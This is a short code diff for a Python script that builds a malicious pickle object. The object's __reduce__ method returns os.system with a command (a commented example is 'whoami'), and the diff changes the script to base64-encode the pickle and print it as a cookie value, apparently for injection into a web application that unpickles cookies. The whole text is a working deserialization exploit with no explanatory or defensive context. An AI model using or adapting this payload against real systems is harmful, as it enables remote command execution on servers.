@@ -1,5 +1,7 @@
+import base64
 import pickle
 import os
+
 
 class Test(object):
         def __reduce__(self):
@@ -7,5 +9,7 @@ class Test(object):
                 # cmd = ('whoami')
                 return os.system, (cmd,)
 
+
 a = pickle.dumps(Test())
-b = pickle.loads(a)
+cookie = base64.urlsafe_b64encode(a).decode()
+print(cookie)
